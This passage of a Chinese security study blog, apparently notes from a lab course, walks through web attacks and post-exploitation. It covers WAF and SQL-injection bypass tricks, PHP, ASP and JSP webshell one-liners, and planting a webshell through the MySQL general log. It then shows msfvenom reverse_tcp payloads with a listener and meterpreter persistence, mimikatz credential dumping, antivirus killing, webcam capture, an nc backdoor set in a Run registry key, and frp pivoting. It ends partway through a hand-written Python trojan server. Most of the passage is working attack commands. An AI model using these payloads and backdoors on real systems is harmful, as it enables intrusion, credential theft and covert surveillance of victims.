反序列化漏洞</h3>\n<h1 id=\"34-sql-注入及-waf-绕过\"><a class=\"anchor\" href=\"#34-sql-注入及-waf-绕过\">#</a> 3.4 sql 注入及 waf 绕过</h1>\n<h2 id=\"waf\"><a class=\"anchor\" href=\"#waf\">#</a> waf</h2>\n<p>WAF（Web Application Firework）web 应用防火墙</p>\n<h3 id=\"类型\"><a class=\"anchor\" href=\"#类型\">#</a> 类型</h3>\n<ul>\n<li>\n<p>软件型</p>\n</li>\n<li>\n<p>硬件型</p>\n</li>\n<li>\n<p>云 WAF 反向代理工作，通过配置 NS 记录或者 CNAME 记录，带有防护的 CDN</p>\n</li>\n<li>\n<p>网站系统内置的 WAF（代码之类的）</p>\n</li>\n</ul>\n<h3 id=\"功能\"><a class=\"anchor\" href=\"#功能\">#</a> 功能</h3>\n<ul>\n<li>审计</li>\n<li>访问控制 / 过滤</li>\n<li>web 加固</li>\n</ul>\n<h3 id=\"waf-怎么识别扫描器\"><a class=\"anchor\" href=\"#waf-怎么识别扫描器\">#</a> WAF 怎么识别扫描器</h3>\n<ul>\n<li>\n<p>AWVS、SQLMAP、APPscan、OpenVAS 等工具（基于白盒 / 灰盒渗透测试）</p>\n</li>\n<li>\n<p>以下几点来识别 WAF：</p>\n<ul>\n<li>\n<p>扫描器指纹（head 字段 / 请求的参数值）</p>\n</li>\n<li>\n<p>单 IP+cookie 某一时间段触发多少次来判断</p>\n</li>\n<li>\n<p>隐藏连接标签</p>\n</li>\n</ul>\n</li>\n<li>\n<p>如何判断目标是否有 WAF</p>\n<ul>\n<li>\n<p>sqlmap -u url --identity-waf --batch</p>\n</li>\n<li>\n<p>手工判断</p>\n<ul>\n<li>\n<p>写一个注入到一个不存在的参数，用来触发 WAF</p>\n</li>\n<li>\n<p>触发：形式变现：页面无法访问、响应码异常、返回与页面不符</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"sql-注入绕过\"><a class=\"anchor\" href=\"#sql-注入绕过\">#</a> SQL 注入绕过</h2>\n<p>黑名单过滤：空格、\\、/、'、and、or、union、select、sleep ()、\"</p>\n<ul>\n<li>\n<p>双写绕过</p>\n</li>\n<li>\n<p>大小写绕过</p>\n</li>\n<li>\n<p>编码绕过（base64、url、ascii、宽字符、Unicode）</p>\n</li>\n<li>\n<p>替换关键字</p>\n</li>\n<li>\n<p>注释绕过（内联注释 /**/ ）</p>\n</li>\n</ul>\n<p>等等等</p>\n<h1 id=\"35-webshell\"><a class=\"anchor\" href=\"#35-webshell\">#</a> 3.5 webshell</h1>\n<h2 id=\"概念\"><a class=\"anchor\" href=\"#概念\">#</a> 概念</h2>\n<p>web + shell</p>\n<p>web：web 服务器上</p>\n<p>shell：用脚本语言编写的脚本程序</p>\n<p>webshell 用来进行网站和服务器管理的脚本程序</p>\n<h2 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h2>\n<ul>\n<li>\n<p>大马：体积大、功能全、会调用系统相关的函数、代码通过加密的方式隐藏</p>\n</li>\n<li>\n<p>小马：体积小、功能小、如只有上传功能</p>\n</li>\n<li>\n<p>一句话木马 / 混淆一句话：代码短、只有一行、安全性高、隐蔽性强、可变形免杀</p>\n</li>\n</ul>\n<h2 id=\"编写方法\"><a class=\"anchor\" href=\"#编写方法\">#</a> 编写方法</h2>\n<ul>\n<li>\n<p>asp： <code>&lt;%execute(request(\"value\"))%&gt;</code></p>\n</li>\n<li>\n<p>php： <code>&lt;?php eval($_POST[1]);?&gt;</code></p>\n</li>\n<li>\n<p>jsp：</p>\n<pre><code class=\"language-jsp\">&lt;%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%&gt;\n\n&lt;%\nif(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());\n%&gt;\n</code></pre>\n</li>\n<li>\n<p>aspx:</p>\n<pre><code class=\"language-asp\">&lt;%@ Page Language=\"Jscript\"%&gt;\n&lt;%eval(Request.Item[\"value\"])%&gt;\n</code></pre>\n</li>\n</ul>\n<p>使用方法</p>\n<ul>\n<li>\n<p>直接通过上传 webshell 到服务器的 web 目录</p>\n</li>\n<li>\n<p>找到数据库是.asp、.php、.jsp 格式的网站，然后留言板、论坛文章发表的方式、把一句话木马添加到数据库中</p>\n</li>\n<li>\n<p>把一句话木马插入到网站的动态页面，然后直接通过客户端（蚁剑、菜刀...）连接网页</p>\n</li>\n</ul>\n<h2 id=\"上传攻击原理\"><a class=\"anchor\" href=\"#上传攻击原理\">#</a> 上传攻击原理</h2>\n<p>利用函数，控制参数，执行任意语句，执行命令</p>\n<h2 id=\"上传绕过方法\"><a class=\"anchor\" href=\"#上传绕过方法\">#</a> 上传绕过方法</h2>\n<ol>\n<li>js 绕过：抓包修改、禁用 js</li>\n<li>%00 绕过</li>\n</ol>\n<h1 id=\"36-webshell-提权\"><a class=\"anchor\" href=\"#36-webshell-提权\">#</a> 3.6 webshell 提权</h1>\n<h2 id=\"获取-webshell\"><a class=\"anchor\" href=\"#获取-webshell\">#</a> 获取 webshell</h2>\n<h3 id=\"phpmyadmin-提权写文件写一句话木马\"><a class=\"anchor\" href=\"#phpmyadmin-提权写文件写一句话木马\">#</a> phpmyadmin 提权写文件，写一句话木马</h3>\n<h3 id=\"日志写入一句话\"><a class=\"anchor\" href=\"#日志写入一句话\">#</a> 日志写入一句话</h3>\n<ul>\n<li>\n<p>首先要开启日志记录</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">show</span> VARIABLES <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%general%'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#查看是否开启</span></pre></td></tr></tbody></table></figure><p>如果返回</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>general_log    <span class=\"token keyword\">OFF</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>general_log_file    C:\\phpStudy\\PHPTutorial\\MySQL\\<span class=\"token keyword\">data</span>\\zhong<span class=\"token operator\">-</span>PC<span class=\"token punctuation\">.</span>log</pre></td></tr></tbody></table></figure><p>可以看到为关闭状态</p>\n<p>为了通过日志获得 webshell，我们需要开启，同时为了使得日志能够被解析，将其日志文件命名为 php 文件，并放在网站根目录</p>\n<p>根目录可以通过 phpinfo.php 获知</p>\n</li>\n<li>\n<p>执行以下 sql 语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span> <span class=\"token keyword\">global</span> general_log <span class=\"token operator\">=</span> <span class=\"token string\">'on'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">set</span> <span class=\"token keyword\">global</span> general_log_file <span class=\"token operator\">=</span> <span class=\"token string\">'C:\\\\phpStudy\\\\PHPTutorial\\\\www\\\\1.php'</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>再执行</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">show</span> VARIABLES <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%general%'</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>返回</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>general_log  <span class=\"token keyword\">ON</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>general_log_file   C:\\phpStudy\\PHPTutorial\\www\\<span class=\"token number\">1.</span>php</pre></td></tr></tbody></table></figure><p>然后执行</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_POST[1]);?&gt;'</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>访问日志文件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguNDcuMTQwLzEucGhw\">http://192.168.47.140/1.php</span></p>\n<p>可以看到 php 报错，未设置  <code>1</code>  的值</p>\n</li>\n</ul>\n<p>蚁剑连接</p>\n<h2 id=\"生成木马\"><a class=\"anchor\" href=\"#生成木马\">#</a> 生成木马</h2>\n<p>打开 kali 机，利用 msfvenom 生成木马</p>\n<p>这里以 windows 机为例</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>msfvenom <span class=\"token parameter variable\">-p</span> windows/x64/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.47.129 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> <span class=\"token parameter variable\">-a</span> x64 <span class=\"token parameter variable\">-f</span> exe <span class=\"token operator\">&gt;</span><span class=\"token number\">4</span>.exe</pre></td></tr></tbody></table></figure><p>其中 <code>LHOST</code>  为本地攻击机（即 kali）， <code>LPORT</code>  为端口， <code>-a</code>  为系统位数， <code>-f</code>  生成文件类型</p>\n<p>32 位系统</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>msfvenom <span class=\"token parameter variable\">-p</span> windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.47.129 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> <span class=\"token parameter variable\">-a</span> x86 <span class=\"token parameter variable\">-f</span> exe <span class=\"token operator\">&gt;</span><span class=\"token number\">4</span>.exe</pre></td></tr></tbody></table></figure><p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_1.jpg\" alt=\"\"></p>\n<p>执行后会在当前目录下生成一个 4.exe 文件</p>\n<h2 id=\"kali-监听\"><a class=\"anchor\" href=\"#kali-监听\">#</a> kali 监听</h2>\n<p>kali 分别执行以下命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use exploit/multi/handler</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/x64/meterpreter/reverse_tcp <span class=\"token comment\"># 如果位 x86 则去除 x64 目录</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.47.129 <span class=\"token comment\"># 设置监听机</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>run <span class=\"token comment\"># 开始监听</span></pre></td></tr></tbody></table></figure><p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_2.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_3.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_4.jpg\" alt=\"\"></p>\n<h2 id=\"上传并使用木马\"><a class=\"anchor\" href=\"#上传并使用木马\">#</a> 上传并使用木马</h2>\n<p>在蚁剑上传该木马到网站的根目录</p>\n<p>使用蚁剑的虚拟终端，输入 <code>4.exe</code> , 运行上传的文件，可以看到 kali 机获得了命令窗口</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_8.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_5.jpg\" alt=\"\"></p>\n<p>输入 <code>getuid</code> ，可以看到为管理员权限，然后可以输入 <code>getsystem</code>  获取系统权限</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_6.jpg\" alt=\"\"></p>\n<p>使用命令 <code>run persistence -S -U -X -i 5 -p 4444 -r 192.168.47.129</code>  留后门，当目标机重启且 kali 攻击机开启监听时，会自动获取命令窗口</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_7.jpg\" alt=\"\"></p>\n<h1 id=\"37-渗透信息收集\"><a class=\"anchor\" href=\"#37-渗透信息收集\">#</a> 3.7 渗透信息收集</h1>\n<h2 id=\"反弹连接木马获取-shell\"><a class=\"anchor\" href=\"#反弹连接木马获取-shell\">#</a> 反弹连接木马获取 shell</h2>\n<p>同上面 webshell 提权的获取 shell 方法，利用 msfvenom 生成一个木马并使目标机运行</p>\n<p><code>getuid</code>  查看当前用户</p>\n<p><code>net user</code>  查看所有用户 (无法使用时，输入 shell 弹出 cmd 的窗口)</p>\n<p><code>net user 用户名</code> 查看该用户在哪个用户组，有什么权限</p>\n<h2 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h2>\n<p>-UAC (User Account Control 用户账户控制)</p>\n<p>要求用户在执行可能影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员密码</p>\n<p>-UAC 绕过提权</p>\n<p>Exploit/windows/local/ask</p>\n<p>// 高等级执行绕过 uac----- 需要用户确认</p>\n<p>use exploit/windows/local/bypassuac</p>\n<p>// 无弹窗的 uac 绕过</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>background # 将会话放到后台</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>session # 查看当前拥有会话</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>session -i 编号 # 进入指定编号的会话</pre></td></tr></tbody></table></figure><p>（利用 ms17-010 永恒之蓝获取 system 权限）</p>\n<h2 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h2>\n<p>Msf 下进行信息收集:</p>\n<ul>\n<li>\n<p>Run post/windows/gather/forensics/enum_drives// 获取目标机器的分区情况</p>\n</li>\n<li>\n<p>Run post/windows/gather/checkvm// 判断是否为虚拟机</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_services// 开启哪些服务</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_applications// 安装了那些应用</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_shares// 查看共享</p>\n</li>\n<li>\n<p>Run post/windows/gather/dumplinks.// 获取主机最近的系统操作</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_applications// 查看补丁</p>\n</li>\n<li>\n<p>Run post/windows/manage/killav// 命令关闭目标机系统杀毒软件。</p>\n</li>\n<li>\n<p>Run post/windows/manage/enable_rdp// 命令启动目标机的远程桌面协议，也就是常说的 3389 端口</p>\n</li>\n<li>\n<p>Run post/windows/mange/autoroute// 命令查看目标机的本地子网情况。</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_logged_on_users// 命令列举当前有多少用户登录了自标机”</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_applications// 命令列举安装在目标机上的应用程序</p>\n</li>\n<li>\n<p>screenshot // 截图</p>\n</li>\n<li>\n<p>webcam_list // 查看目标机是否有摄像头</p>\n</li>\n<li>\n<p>webcam_snap // 打开目标摄像头，拍一张照片</p>\n</li>\n<li>\n<p>webcam_stream // 开启直播模式</p>\n</li>\n<li>\n<p>shll // 进入目标机的 shell 下面</p>\n</li>\n<li>\n<p>exit // 停止 meterpreter 会话</p>\n</li>\n<li>\n<p>文件系统命令</p>\n<ul>\n<li>\n<p>pwd 或 getwd // 查看当前处于的目录</p>\n</li>\n<li>\n<p>getlwd // 查看</p>\n</li>\n<li>\n<p>ls</p>\n</li>\n<li>\n<p>cd</p>\n</li>\n<li>\n<p>search -f *.txt -d c:\\ // 搜索 c 盘下所有以 '.txt' 为后缀的文件，-f 用于指定搜索文件模式，-d 用于指定在哪个目录下进行</p>\n</li>\n</ul>\n</li>\n<li>\n<p>hash 破解登陆密码（mimikatz 现在改为 kimi，使用命令也有所不同，具体见 help)</p>\n<ul>\n<li>\n<p>meterpreter &gt; load mimikatz // 启动 mimikatz 模块</p>\n</li>\n<li>\n<p>meterpreter &gt; help // 查看帮助</p>\n</li>\n<li>\n<p>meterpreter &gt; msv // 获取登录密码的 hash 值</p>\n</li>\n<li>\n<p>meterpreter &gt; mimikatz_command -f samdump::hashes // 获取登录密码的 hash 值</p>\n</li>\n<li>\n<p>meterpreter &gt; ssp // 获取的是明文信息</p>\n</li>\n<li>\n<p>meterpreter &gt; tspkg // 获取的是明文信息</p>\n</li>\n<li>\n<p>meterpreter &gt; wdigest // 读取内存中存放的账号密码明文信息</p>\n</li>\n<li>\n<p>meterpreter &gt; kerberos // 获取明文密码</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>或者运行以下脚本</p>\n<ul>\n<li>\n<p>run Scraper</p>\n</li>\n<li>\n<p>run Winenum</p>\n</li>\n</ul>\n<p>获取常用的信息</p>\n<h1 id=\"38-nc-后门\"><a class=\"anchor\" href=\"#38-nc-后门\">#</a> 3.8 NC 后门</h1>\n<h2 id=\"ms17-010-获取系统权限\"><a class=\"anchor\" href=\"#ms17-010-获取系统权限\">#</a> ms17-010 获取系统权限</h2>\n<h2 id=\"nc-后门\"><a class=\"anchor\" href=\"#nc-后门\">#</a> Nc 后门</h2>\n<h3 id=\"上传-nc-后门\"><a class=\"anchor\" href=\"#上传-nc-后门\">#</a> 上传 nc 后门</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>upload /root/nc.exe c:<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>windows<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>system32</pre></td></tr></tbody></table></figure><h3 id=\"修改注册表\"><a class=\"anchor\" href=\"#修改注册表\">#</a> 修改注册表</h3>\n<p>+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run // 查看键值</p>\n<ul>\n<li>\n<p><code>reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v nc -d 'C:\\windows\\system32\\nc.exe -Ldp 4444 -e cmd.exe'</code> // 添加 nc 键值</p>\n<p>-k 为注册表路径 -v 为进程名 -d 后为启动程序所在位置 4444 为服务端口号 -e 返回内容（cmd.exe 返回系统的交互窗口）</p>\n</li>\n<li>\n<p><code>reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v nc</code> // 查看</p>\n</li>\n</ul>\n<p>重启，可以发现防火墙阻止了网络功能，这里需要关闭防火墙或者通过之前获得权限，将端口写入到防火墙中允许的端口中</p>\n<h3 id=\"防火墙允许端口添加时防火墙应处于关闭状态\"><a class=\"anchor\" href=\"#防火墙允许端口添加时防火墙应处于关闭状态\">#</a> 防火墙，允许端口（添加时，防火墙应处于关闭状态）</h3>\n<ul>\n<li>\n<p>execute -f cmd -i -H // 生成 shell (或者输入 shell)</p>\n</li>\n<li>\n<p>cmd：netsh firewall show opmode // 查看防火墙状态</p>\n</li>\n<li>\n<p>netsh firewall add portopening TCP 444 \"textx\" ENABLE ALL</p>\n</li>\n<li>\n<p>netsh firewall add portopening TCP 4444 \"FireWall\" ENABLE ALL</p>\n</li>\n<li>\n<p>netsh firewall add portopening TCP 7776 \"QQ\" ENABLE ALL</p>\n</li>\n</ul>\n<h1 id=\"39-内网转发穿透\"><a class=\"anchor\" href=\"#39-内网转发穿透\">#</a> 3.9 内网转发穿透</h1>\n<h2 id=\"获取内网服务器的-session\"><a class=\"anchor\" href=\"#获取内网服务器的-session\">#</a> 获取内网服务器的 session</h2>\n<ul>\n<li>\n<p>配置 frp 穿透：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==\">https://github.com/fatedier/frp</span></p>\n</li>\n<li>\n<p>端口映射，假设靶机 4444 端口映射到公网的 6002 端口</p>\n</li>\n<li>\n<p>使用木马反弹 session</p>\n<ul>\n<li>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=g 公网 ip LPORT=6002 (即转发到的公网端口) -f exe &gt;test.exe</p>\n</li>\n<li>\n<p>生成一个 test.exe 木马</p>\n</li>\n</ul>\n</li>\n<li>\n<p>选择模块监听</p>\n<ul>\n<li>\n<p>use exploit/multi/handler</p>\n</li>\n<li>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n</li>\n<li>\n<p>set lhost 攻击机 ip</p>\n</li>\n<li>\n<p>set lport 4444 攻击机监听端口</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"内网代理转发\"><a class=\"anchor\" href=\"#内网代理转发\">#</a> 内网代理转发</h2>\n<h3 id=\"内网探测\"><a class=\"anchor\" href=\"#内网探测\">#</a> 内网探测</h3>\n<p>msf 中，获取到一台机子的 session 后 (该机子可以访问内网的机器)</p>\n<ul>\n<li>\n<p>run post/windows/gather/arp_scanner rhost = 内网 ip（如 192.168.1.0/24） 扫描内网中的 (192.168.1.0) 网段</p>\n</li>\n<li>\n<p>run post/multi/manage/autoroute// 自动添加路由</p>\n</li>\n<li>\n<p>run autoroute -s 192.168.2.1/24 // 添加 192.168.2.1/24 的路由</p>\n</li>\n<li>\n<p>run autoroute -p // 查看路由条目</p>\n</li>\n<li>\n<p>但此时 nmap 扫描无法扫出，需要使用 socks 代理</p>\n</li>\n<li>\n<p>同样的 msf 中</p>\n<ul>\n<li>\n<p>use auxiliary/sever/socks4a// 设置 socks 代理服务器</p>\n</li>\n<li>\n<p>set SRVHOST ip</p>\n</li>\n<li>\n<p>set SRVPORT port</p>\n</li>\n</ul>\n</li>\n<li>\n<p>设置 proxychains 代理</p>\n<ul>\n<li>\n<p>vim /etc/proxychains.conf</p>\n<p>设置 socks4 之前设置的 socks 的 ip 设置的端口</p>\n</li>\n</ul>\n</li>\n<li>\n<p>使用 proxychains</p>\n<ul>\n<li>proxychains nmap -sT -sV --script=vuln 目标内网机 ip</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"310-服务器安全加固\"><a class=\"anchor\" href=\"#310-服务器安全加固\">#</a> 3.10 服务器安全加固</h1>\n<p>给出服务器的 ssh 账号密码</p>\n<p>例子为 zzcms 网站 (相关漏洞可以搜索查找)</p>\n<h2 id=\"获取服务器的系统信息\"><a class=\"anchor\" href=\"#获取服务器的系统信息\">#</a> 获取服务器的系统信息</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> /etc/*release*</pre></td></tr></tbody></table></figure><h2 id=\"查看开启端口\"><a class=\"anchor\" href=\"#查看开启端口\">#</a> 查看开启端口</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">netstat</span> <span class=\"token parameter variable\">-antp</span></pre></td></tr></tbody></table></figure><p>发现开启 3306 (mysql),6379 (redis),22 (ssh),80 (http)</p>\n<h2 id=\"查看进程\"><a class=\"anchor\" href=\"#查看进程\">#</a> 查看进程</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-ef</span></pre></td></tr></tbody></table></figure><p>显示所有进程</p>\n<h2 id=\"找寻突破口\"><a class=\"anchor\" href=\"#找寻突破口\">#</a> 找寻突破口</h2>\n<h3 id=\"3306-mysql\"><a class=\"anchor\" href=\"#3306-mysql\">#</a> 3306 mysql</h3>\n<ul>\n<li>\n<p>找寻配置文件，查看是否有密码</p>\n</li>\n<li>\n<p>爆破进入</p>\n</li>\n<li>\n<p>是否允许远程登录 (通过数据库访问，查看数据库用户信息 (user 表))</p>\n</li>\n<li>\n<p>查表，查看各种账户信息 (管理员之类的账号，根据其密码形式 (如弱密码)，进行修改 (网页修改 / 数据库修改))</p>\n</li>\n</ul>\n<h3 id=\"6379-redis\"><a class=\"anchor\" href=\"#6379-redis\">#</a> 6379 redis</h3>\n<p>查看启动目录下的 redis 脚本 <code>vim /etc/init.d/redis</code></p>\n<p>redis 默认密码 <code>foobared</code>  修改密码</p>\n<p>修改好后需要重启</p>\n<ul>\n<li>\n<p>再次运行 redis 脚本</p>\n</li>\n<li>\n<p>如果上面一条不行，那么可以使用 kill 杀掉进程</p>\n<ul>\n<li>\n<p>首先使用 <code>ps -ef | grep redis</code>  获取进程号</p>\n</li>\n<li>\n<p>然后使用 kill 命令 <code>kill 进程号</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"311-手把手自编木马\"><a class=\"anchor\" href=\"#311-手把手自编木马\">#</a> 3.11 手把手自编木马</h1>\n<h2 id=\"自编远程控制电脑木马\"><a class=\"anchor\" href=\"#自编远程控制电脑木马\">#</a> 自编远程控制电脑木马</h2>\n<h3 id=\"涉及知识或技术\"><a class=\"anchor\" href=\"#涉及知识或技术\">#</a> 涉及知识或技术</h3>\n<ul>\n<li>\n<p>操作系统</p>\n<ul>\n<li>\n<p>win/linux/android</p>\n</li>\n<li>\n<p>命令、服务、特性 (不同系统下)、</p>\n</li>\n</ul>\n</li>\n<li>\n<p>网络协议</p>\n<ul>\n<li>\n<p>osi 七层网络</p>\n</li>\n<li>\n<p>tcp/ip 协议族群</p>\n</li>\n<li>\n<p>应用层</p>\n</li>\n<li>\n<p>传输层 /tcp/udp</p>\n</li>\n<li>\n<p>网络层</p>\n</li>\n<li>\n<p>链路层</p>\n</li>\n</ul>\n</li>\n<li>\n<p>程序语言</p>\n<ul>\n<li>\n<p>python</p>\n<ul>\n<li>\n<p>环境简单</p>\n</li>\n<li>\n<p>弱规则</p>\n</li>\n<li>\n<p>第三方库</p>\n</li>\n<li>\n<p>以及自定义的库或模块</p>\n</li>\n</ul>\n</li>\n<li>\n<p>go</p>\n</li>\n<li>\n<p>ruby</p>\n</li>\n<li>\n<p>html，js</p>\n</li>\n</ul>\n</li>\n<li>\n<p>打包工具</p>\n</li>\n</ul>\n<h3 id=\"编写\"><a class=\"anchor\" href=\"#编写\">#</a> 编写</h3>\n<p>server</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># server: 放在被攻击机 - 木马</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># dos 下</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> socket <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 创建连接 tcp</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>qq <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">(</span>AF_INET<span class=\"token punctuation\">,</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 绑定主机 ip</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>address <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">12345</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>qq<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>qq<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    newsct<span class=\"token punctuation\">,</span> clientsct <span class=\"token operator\">=</span> qq<span class=\"token punctuation\">.</span>accept<span class=\"token punctuation\">(</span><span class=\"token 